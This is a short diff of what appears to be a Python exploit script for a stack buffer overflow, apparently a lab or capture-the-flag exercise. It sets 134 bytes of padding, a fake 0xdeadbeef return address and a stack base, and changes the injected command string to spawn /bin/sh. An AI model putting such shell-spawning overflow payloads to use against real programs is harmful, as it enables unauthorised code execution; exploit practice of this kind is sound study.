@@ -3,8 +3,11 @@
 import sys
 
 oflow = b'A' * 134
+
 #string = b"ls -a\0"
-string = b"whoami && /bin/sh\0"
+#string = b"open(\"/dev/tty\", O_RDWR|O_NOCTTY|O_TRUNC|O_APPEND|O_ASYNC) && /bin/sh\0"
+string = b"/bin/sh <input\0"
+
 fakeret = b'\xef\xbe\xad\xde'
 
 stack_base=0xffffd80c
